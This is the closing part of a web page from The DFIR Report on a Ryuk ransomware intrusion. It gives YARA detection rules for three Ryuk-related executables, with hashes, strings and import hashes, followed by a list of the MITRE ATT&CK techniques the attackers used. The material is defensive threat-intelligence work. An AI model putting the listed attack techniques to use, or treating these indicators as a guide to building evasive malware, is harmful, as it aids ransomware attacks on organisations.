/>}<br /><br /><br />rule ryuk_exes_arti64 {<br />meta:<br />description = "exes - file arti64.dll"<br />author = "The DFIR Report"<br />reference = "https://thedfirreport.com"<br />date = "2020-10-04"<br />hash1 = "f22449c01f8233ea7c85a49f2b6b5fedd304fca5c0e58176bafda9218873c2dd"<br />strings:<br />$s1 = "PluginSample.dll" fullword ascii<br />$s2 = "B:\\x32\\dll\\x64\\Release\\PluginSample.pdb" fullword ascii<br />$s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii<br />$s4 = "AcquireSamplePlugin::DisplayConfigureDialog" fullword wide<br />$s5 = "AppPolicyGetThreadInitializationType" fullword ascii<br />$s6 = "`template-parameter-" fullword ascii<br />$s7 = "operator&lt;=&gt;" fullword ascii<br />$s8 = "operator co_await" fullword ascii<br />$s9 = "AppPolicyGetWindowingModel" fullword ascii<br />$s10 = "Transfer Completed Successfully!" fullword wide<br />$s11 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii<br />$s12 = "noexcept" fullword ascii<br />$s13 = "Read-Only Photo Acquire Plugin" fullword wide<br />$s14 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide<br />$s15 = "Software\\Microsoft\\Windows\\CurrentVersion\\Photo Acquisition\\Plugins\\%ws" fullword wide<br />$s16 = "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="240a1b65716d715741566d4a5451507750564d4a4364">[email&#160;protected]</a>@" fullword ascii<br />$s17 = "CLSID\\%ws\\InprocServer32" fullword wide<br />$s18 = "`generic-type-" fullword ascii<br />$s19 = "e&gt;_eUsEi+H&lt;Cc%RZtSC7QIt*HvDb68Pj3" fullword ascii<br />$s20 = "Default Plugin Text" fullword wide<br />condition:<br />uint16(0) == 0x5a4d and filesize &lt; 2000KB and<br />( pe.imphash() == "0fd22f187f22ab4ec2eb55f91ccefa7a" and ( pe.exports("StartW") and pe.exports("TREWDGGegrfgyetdfghfGFEWRDSFGSDgf") ) or all of them )<br />}<br /><br />rule ryuk_fx16_multi_for_crypt_x86 {<br />meta:<br />description = "exes - file fx16_multi_for_crypt_x86.exe"<br />author = "The DFIR Report"<br />reference = "https://thedfirreport.com"<br />date = "2020-10-04"<br />hash1 = "f7998c8b083b31e8b0e8eaf197f6db65b100d44d94700e0780e81c7d54eefcf5"<br />strings:<br />$s1 = "LuxIsnXwkvavqUaBlcqjWmmutckYHRjvSmOKvtRMwvSKnQMiJqUoYEcMzIANnFlVcyliOfiiaTsMnNWaNDDONiTDSmFdkCUOhbbwDEtmcfRLjjefjZriLAhaXJDkIwqK" ascii<br />$s2 = "TYthgQVhYkfpnSlftPAzcdzAqVSlhPTZHjIthwkQuhrUvkIDilbaqJbwDZbiXcgGuIDIhJeCGXdfluoqjoelRuZNFWqNIPBiOgpChjNNZFJGQvjCPwQNvfRynJsfwjgt" ascii<br />$s3 = "IEOffhhLBexvIlCbvoQaZljxwWNMTczTsCUzgDpMsHSPyQIttHUgFUPadSIhtBYFrQNAKZiSvJglfknwqRoUxuuxWCwCwnQyVPAPhglCcdUTTswasiPyGYNimSUMQjbd" ascii<br />$s4 = "fVHNcZJdHEkcoMdCUvMUMRzbsdjHdGdTFmIoZXWDQHBQNYzPNEiAjdsYtHBlIxyoWwSoDVwnfFTXxZGBUpsegUPrEANCvrQCzqCFQbcfZXTZFgCuzAWmQrHEZpXrZpRg" ascii<br />$s5 = "cXuNyWQgbFQlughZovoZDwAHHWvWqeZlfFKFKfxwAmWWlHOpKoSdnbPehKrooTcWjrYuZJjVAYkxMVwuBLkaFVpdnsJeQZvEmoJchvjBTOFpTKBJGVxbYlLKMLQvTyYA" ascii<br />$s6 = "sjDUCMurdFjEkVRmOZHRYtajSNmSgxfmnvUnJmJgDGGsqEOeCADepuzBzinLnjnAfiZWzVrWstXexwCczXQwTpxzeXAhJTByziBxWCYZlppokDSgEteKyORiOEyUSSnz" ascii<br />$s7 = "GgcaduyeETNVsnybynUUywlxcoamtRlealYeLGXbpXBDTEJYavXdJAryMLCsZKrffWnBgAdGhLxqrgRebcImIXNEafCYCgEtaXsWdWiYKkUyztrNIiktgizPBsqcgmzs" ascii<br />$s8 = "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="563f2e223900050f1b3d16322c18">[email&#160;protected]</a>`TJ\\vtGVyqa|P{YGow|%" fullword ascii<br />$s9 = "`<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="84f3c4f4">[email&#160;protected]</a>]H`suAVER\\~l^sG" fullword ascii<br />$s10 = "Picuovphv Bbsg!Es|rwojrarkkd Stryjfes x4.3" fullword ascii<br />$s11 = "\"YIWKqFIIAtSmNnwAnddonItdsMfDKcuoHBBWdeTMCFrlJJEFJzRIlaHAxjdKiWQkAnlaGHbAlIk}*1}TqVzGTDaqlaDozCvbwgtlzcnfBUGSqRnVAkmwbDvMytcETx" ascii<br />$s12 = "OhqMCeeltSHDtTWKtVLmEURx'kz y\"7" fullword ascii<br />$s13 = "FrystFsgcteIaui" fullword ascii<br />$s14 = "JJaZFfGMWkYZvWZVgeqjvEBRIOmpsPZnmqGtsbupUOlsQicTzEmJbveDkpsVrglajErQAxMvSxFydAdbEPwlBqDgZyBPTIGtmkHiVmRICiTYdlGESEwxyZegjuJRXpxR" ascii<br />$s15 = "HiaqQCPQHIAFgVRMdAUUmtLWGbUVlQRcTWvjUBTLYpoEHeBDNWCMIlBrjIsSlNmHWUKjMFeEkPJkeGftHCUVKGwLckfhIYNcNhXudKCxbtHDaEVYNXvGWqDwTRRZLHDy" ascii<br />$s16 = "FrystDdswirfCqovf{vD" fullword ascii<br />$s17 = "QvehbLauVGuTdFKhOKGSIwAgBxTFhkGiZRyBVMqFXKegVZQPPOQdrrZwuNewAYNzDiznmhdgyiovipThWdtgnIldoRbAaaIXUbmtlRqIzVdHauhFxZZdPbikovdJnXye" ascii<br />$s18 = "nFDnFOWGPuHyRcKShALUFIaVlXXwURYhHjhnRpCOuupuuBaIKJDbcbeAjHlojxJHKLrkQMmVvLSiLbRUBFigsUWkXCYiXstkJLZOJhWgvBCxaXKGVTjhfLPZDgbOxSNk" ascii<br />$s19 = "CtJHYQXcJSNgHqnKRdZhxKPMQvZYXQZsgrwtQStObwzMfbjjyaXlDNoxVclplvGxkoQlIKsSJZOVRJzlxaMrMCkoodjKxHuGbgXhEzmEXprSiRHaCrJildftVgahaRZK" ascii<br />$s20 = "`EwSCLyaEZUPQuJBXob" fullword ascii<br />condition:<br />uint16(0) == 0x5a4d and filesize &lt; 400KB and<br />( pe.imphash() == "2ce62b0c0226079a88a01c701dbee7b9" or 8 of them )<br />}<br /><br />rule ryuk_Document_Preview {<br />meta:<br />description = "exes - file Document-Preview.exe"<br />author = "The DFIR Report"<br />reference = "https://thedfirreport.com"<br />date = "2020-10-04"<br />hash1 = "85ef348d39610c1d5f58e2524c0e929ec815a9fbe1f5924cdef7a0c05e58e5ad"<br />strings:<br />$s1 = "MultiReco.exe" fullword ascii<br />$s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii<br />$s3 = "Error initializing the common controls." fullword wide<br />$s4 = "Error reading data from the file." fullword wide<br />$s5 = "operator&lt;=&gt;" fullword ascii<br />$s6 = "operator co_await" fullword ascii<br />$s7 = "Error opening the file!" fullword wide<br />$s8 = "Error creating the window" fullword wide<br />$s9 = "Error creating new stroke collection." fullword wide<br />$s10 = "Failed connect to the recognition context's event source." fullword wide<br />$s11 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide<br />$s12 = "Failed to attach the stroke collection to the recognition context" fullword wide<br />$s13 = "Failed to add the strokes to the Ink object's custom stroke collection" fullword wide<br />$s14 = "Error loading ink object from the file." fullword wide<br />$s15 = "You need to have at least one in order to run this sample." fullword wide<br />$s16 = "Failed to create a unique string id for the stroke collection" fullword wide<br />$s17 = "Recognition has failed. No results will be stored in the stroke collection." fullword wide<br />$s18 = "*- *[Cv" fullword ascii<br />$s19 = "ggDeA08" fullword ascii<br />$s20 = "qtwmuy2" fullword ascii<br />condition:<br />uint16(0) == 0x5a4d and filesize &lt; 1000KB and<br />( pe.imphash() == "274676f64ec63375a7825a17a44cba07" and pe.exports("SDqwsgrfTRRADQDSwatuHdfCxv") or 8 of them )<br />}</pre>
<p>
</p>
<p>If you have detections you would like to add to this section, please contact us and we will credit you.</p>
<h2>MITRE</h2>
<p>
</p>
<figure class="wp-block-image size-large"></figure>
<p>
</p>
<figure class="wp-block-image size-large"></figure>
<p>
</p>
<p>User Execution &#8211; T1204 <br />Windows Management Instrumentation &#8211; T1047 <br />Service Execution &#8211; T1035 <br />Scripting &#8211; T1064 <br />PowerShell &#8211; T1086 <br />Rundll32 &#8211; T1085 <br />Process Injection &#8211; T1055 <br />Valid Accounts &#8211; T1078 <br />Disabling Security Tools &#8211; T1089 <br />Account Discovery &#8211; T1087 <br />Domain Trust Discovery &#8211; T1482 <br />Network Service Scanning &#8211; T1046 <br />Query Registry &#8211; T1012 <br />Remote System Discovery &#8211; T1018 <br />Security Software Discovery &#8211; T1063 <br />Remote Services &#8211; T1021 <br />Commonly Used Port &#8211; T1043 <br />Standard Application Layer Protocol &#8211; T1071 <br />Data Encrypted for Impact &#8211; T1486</p>
<p>(internal case 1005)</p>
<p></p><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-911" class="share-twitter sd-button share-icon no-text" href="https://thedfirreport.com/2020/10/08/ryuks-return/?share=twitter" target="_blank" title="Click to share on Twitter"><span></span><span class="sharing-screen-reader-text">Click to share on Twitter (Opens in new window)</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-911" class="share-facebook sd-button share-icon no-text" href="https://thedfirreport.com/2020/10/08/ryuks-return/?share=facebook" target="_blank" title="Click to share on Facebook"><span></span><span class="sharing-screen-reader-text">Click to share on Facebook (Opens in new window)</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-911" class="share-linkedin sd-button share-icon no-text" href="https://thedfirreport.com/2020/10/08/ryuks-return/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span></span><span class="sharing-screen-reader-text">Click to share on LinkedIn (Opens in new window)</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon no-text" href="https://thedfirreport.com/2020/10/08/ryuks-return/?share=reddit" target="_blank" title="Click to share on Reddit"><span></span><span class="sharing-screen-reader-text">Click to share on Reddit (Opens in new window)</span></a></li><li class="share-telegram"><a rel="nofollow noopener noreferrer" data-shared="" class="share-telegram sd-button share-icon no-text" href="https://thedfirreport.com/2020/10/08/ryuks-return/?share=telegram" target="_blank" title="Click to share on Telegram"><span></span><span class="sharing-screen-reader-text">Click to share on Telegram (Opens in new window)</span></a></li><li class="share-skype"><a rel="nofollow noopener noreferrer" data-shared="sharing-skype-911" class="share-skype sd-button share-icon no-text" href="https://thedfirreport.com/2020/10/08/ryuks-return/?share=skype" target="_blank" title="Click to share on Skype"><span></span><span class="sharing-screen-reader-text">Click to share on Skype (Opens in new window)</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts'>
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
<span class="tag-links"><a href="https://thedfirreport.com/tag/adfind/" rel="tag">adfind</a><a href="https://thedfirreport.com/tag/bazar/" rel="tag">bazar</a><a href="https://thedfirreport.com/tag/cobalt-strike/" rel="tag">cobalt strike</a><a href="https://thedfirreport.com/tag/kegtap/" rel="tag">kegtap</a><a href="https://thedfirreport.com/tag/ryuk/" rel="tag">ryuk</a></span> </div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2020/08/31/netwalker-ransomware-in-1-hour/" rel="prev">NetWalker Ransomware in 1 Hour</a></div><div class="nav-next"><a href="https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/" rel="next">Ryuk in 5 Hours</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="blog_subscription-2" class="widget widget_blog_subscription jetpack_subscription_widget"><h2 class="widget-title">Subscribe to Blog via Email</h2>
<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-2">
<div id="subscribe-text"><p>Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p>
</div> <p id="subscribe-email">
<label id="jetpack-subscribe-label" class="screen-reader-text" for="subscribe-field-blog_subscription-2">
Email Address </label>
<input type="email" name="email" required="required" value="" id="subscribe-field-blog_subscription-2" placeholder="Email Address" />
</p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="source" value="https://thedfirreport.com/2020/10/08/ryuks-return/" />
<input type="hidden" name="sub-type" value="widget" />
<input type="hidden" name="redirect_fragment" value="blog_subscription-2" />
<button type="submit" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</form>
</section><section id="twitter_timeline-3" class="widget widget_twitter_timeline"><h2 class="widget-title">Follow us on Twitter</h2><a class="twitter-timeline" data-width="220" data-theme="light" data-border-color="#e8e8e8" data-tweet-limit="5" data-lang="EN" data-partner="jetpack" data-chrome="noheader nofooter noborders transparent noscrollbar" href="https://twitter.com/@TheDFIRReport" href="https://twitter.com/@TheDFIRReport">My Tweets</a></section><section id="jetpack_display_posts_widget-2" class="widget widget_jetpack_display_posts_widget"><h2 class="widget-title">Recent Posts: The DFIR Report</h2><div class="jetpack-display-remote-posts"><h4><a href="https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/" target="_blank" rel="noopener">Ryuk in 5 Hours</a></h4>
<a title="Ryuk in 5 Hours" href="https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/" target="_blank" rel="noopener"><img src="https://i2.wp.com/thedfirreport.com/wp-content/uploads/2020/10/ryuk.png?fit=1093%2C587&ssl=1" alt="Ryuk in 5 Hours" /></a><p>Intro The Ryuk threat actors went from a phishing email to domain wide ransomware in 5 hours. They escalated privileges using Zerologon (CVE-2020-1472), less than 2 hours after the initial &hellip; <a href="https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/" class="more-link">Read More</a></p>
<h4><a href="https://thedfirreport.com/2020/10/08/ryuks-return/" target="_blank" rel="noopener">Ryuk&#8217;s Return</a></h4>
<a title="Ryuk&#8217;s Return" href="https://thedfirreport.com/2020/10/08/ryuks-return/" target="_blank" rel="noopener"><img src="https://i2.wp.com/thedfirreport.com/wp-content/uploads/2020/10/ryuk.png?fit=1093%2C587&ssl=1" alt="Ryuk&#8217;s Return" /></a><p>Intro The Ryuk group went from an email to domain wide ransomware in 29 hours and asked for over $6 million to unlock our systems. They used tools such as &hellip; <a href="https://thedfirreport.com/2020/10/08/ryuks-return/" class="more-link">Read More</a></p>
<h4><a href="https://thedfirreport.com/2020/08/31/netwalker-ransomware-in-1-hour/" target="_blank" rel="noopener">NetWalker Ransomware in 1 Hour</a></h4>
<a title="NetWalker Ransomware in 1 Hour" href="https://thedfirreport.com/2020/08/31/netwalker-ransomware-in-1-hour/" target="_blank" rel="noopener"><img src="https://i2.wp.com/thedfirreport.com/wp-content/uploads/2020/08/image-42.png?fit=639%2C709&ssl=1" alt="NetWalker Ransomware in 1 Hour" /></a><p>The threat actor logged in through RDP, attempted to run a Cobalt Strike Beacon, and then dumped memory using ProcDump and Mimikatz. Next, they RDPed into a Domain Controller, minutes &hellip; <a href="https://thedfirreport.com/2020/08/31/netwalker-ransomware-in-1-hour/" class="more-link">Read More</a></p>
<h4><a href="https://thedfirreport.com/2020/08/03/dridex-from-word-to-domain-dominance/" target="_blank" rel="noopener">Dridex &#8211; From Word to Domain Dominance</a></h4>
<a title="Dridex &#8211; From Word to Domain Dominance" href="https://thedfirreport.com/2020/08/03/dridex-from-word-to-domain-dominance/" target="_blank" rel="noopener"><img src="https://i1.wp.com/thedfirreport.com/wp-content/uploads/2020/08/timeline.png?fit=544%2C608&ssl=1" alt="Dridex &#8211; From Word to Domain Dominance" /></a><h4><a href="https://thedfirreport.com/2020/07/13/ransomware-again-but-we-changed-the-rdp-port/" target="_blank" rel="noopener">Ransomware Again&#8230;But We Changed the RDP Port!?!?!</a></h4>
<a title="Ransomware Again&#8230;But We Changed the RDP Port!?!?!" href="https://thedfirreport.com/2020/07/13/ransomware-again-but-we-changed-the-rdp-port/" target="_blank" rel="noopener"><img src="https://i1.wp.com/thedfirreport.com/wp-content/uploads/2020/07/image-20.png?fit=1222%2C841&ssl=1" alt="Ransomware Again&#8230;But We Changed the RDP Port!?!?!" /></a><p>Here&#8217;s another example of threat actors brute forcing RDP to install ransomware, this time the brute forced system was not using the default RDP port. The threat actors installed ransomware &hellip; <a href="https://thedfirreport.com/2020/07/13/ransomware-again-but-we-changed-the-rdp-port/" class="more-link">Read More</a></p>
</div></section><section id="google_translate_widget-3" class="widget widget_google_translate_widget"><h2 class="widget-title">Translate</h2><div id="google_translate_element"></div></section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Theme: FreeNews <span class="sep"> | </span> By <a href="https://themespiral.com/">ThemeSpiral.com</a>. </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa fa-long-arrow-up"></i>Go Top</button>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2020\/10\/08\/ryuks-return\/":911};
	</script>
<script type='text/javascript' src='https://c0.wp.com/c/5.7.2/wp-includes/js/dist/vendor/wp-polyfill.min.js' id='wp-polyfill-js'></script>
<script type='text/javascript' id='wp-polyfill-js-after'>
( 'fetch' in window ) || document.write( '<script src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );( 'objectFit' in document.documentElement.style ) || document.write( '<script src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill-object-fit.min.js?ver=2.3.4"></scr' + 'ipt>' );
</script>
<script type='text/javascript' id='contact-form-7-js-extra'>
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/thedfirreport.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
/* ]]> */
</script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.1' id='contact-form-7-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=5.7.2' id='freenews-navigation-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=5.7.2' id='freenews-skip-link-focus-fix-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=5.7.2' id='ResizeSensor-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=5.7.2' id='theia-sticky-sidebar-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=5.7.2' id='slick-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=5.7.2' id='freenews-slick-settings-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=5.7.2' id='jquery-sticky-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=5.7.2' id='freenews-sticky-settings-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=5.7.2' id='marquee-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=5.7.2' id='freenews-marquee-settings-js'></script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.7/_inc/build/twitter-timeline.min.js' id='jetpack-twitter-timeline-js'></script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/plugins/jetpack/vendor/automattic/jetpack-lazy-images/src/js/intersectionobserver-polyfill.min.js?ver=1.1.2' id='jetpack-lazy-images-polyfill-intersectionobserver-js'></script>
<script type='text/javascript' id='jetpack-lazy-images-js-extra'>
/* <![CDATA[ */
var jetpackLazyImagesL10n = {"loading_warning":"Images are still loading. Please cancel your print and try again."};
/* ]]> */
</script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/plugins/jetpack/vendor/automattic/jetpack-lazy-images/src/js/lazy-images.min.js?ver=1.1.2' id='jetpack-lazy-images-js'></script>
<script type='text/javascript' id='wp_slimstat-js-extra'>
/* <![CDATA[ */
var SlimStatParams = {"ajaxurl":"https:\/\/thedfirreport.com\/wp-admin\/admin-ajax.php","baseurl":"\/","dnt":"noslimstat,ab-item","ci":"YTo0OntzOjEyOiJjb250ZW50X3R5cGUiO3M6NDoicG9zdCI7czo4OiJjYXRlZ29yeSI7czoyNzoiMjQsMjcsNiwyLDI1LDI2LDI4LDE0LDI5LDMwIjtzOjEwOiJjb250ZW50X2lkIjtpOjkxMTtzOjY6ImF1dGhvciI7czo2OiJlZGl0b3IiO30-.c9cf94c8d853e4e2dbe257f974f3d6a0"};
/* ]]> */
</script>
<script type='text/javascript' src='https://cdn.jsdelivr.net/wp/wp-slimstat/tags/4.8.8.1/wp-slimstat.min.js' id='wp_slimstat-js'></script>
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?render=6LdT96QZAAAAAPgYNKKHOXJj40TDn4FL6KFdhViu&#038;ver=3.0' id='google-recaptcha-js'></script>
<script type='text/javascript' id='wpcf7-recaptcha-js-extra'>
/* <![CDATA[ */
var wpcf7_recaptcha = {"sitekey":"6LdT96QZAAAAAPgYNKKHOXJj40TDn4FL6KFdhViu","actions":{"homepage":"homepage","contactform":"contactform"}};
/* ]]> */
</script>
<script type='text/javascript' src='https://thedfirreport.com/wp-content/plugins/contact-form-7/modules/recaptcha/index.js?ver=5.4.1' id='wpcf7-recaptcha-js'></script>
<script type='text/javascript' src='https://c0.wp.com/c/5.7.2/wp-includes/js/wp-embed.min.js' id='wp-embed-js'></script>
<script type='text/javascript' id='google-translate-init-js-extra'>
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.7/_inc/build/widgets/google-translate/google-translate.min.js' id='google-translate-init-js'></script>
<script type='text/javascript' src='//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&#038;ver=5.7.2' id='google-translate-js'></script>
<script type='text/javascript' id='sharing-js-js-extra'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.7/_inc/build/sharedaddy/sharing.min.js' id='sharing-js-js'></script>
<script type='text/javascript' id='sharing-js-js-after'>
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-telegram' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-telegram' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtelegram', 'menubar=1,resizable=1,width=450,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-skype' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-skype' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomskype', 'menubar=1,resizable=1,width=305,height=665' );
						return false;
					}
				} );
			} )();
</script>
<script src='https://stats.wp.com/e-202120.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.7',blog:'175340963',post:'911',tz:'0',srv:'thedfirreport.com'} ]);
	_stq.push([ 'clickTrackerInit', '175340963', '911' ]);
</script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"653aa2af3b9bf8df","version":"2021.5.1","r":1,"token":"e6611380fbbe475a97dc9cf0a0e9fd2b","si":10}'></script>
</body>
</html>
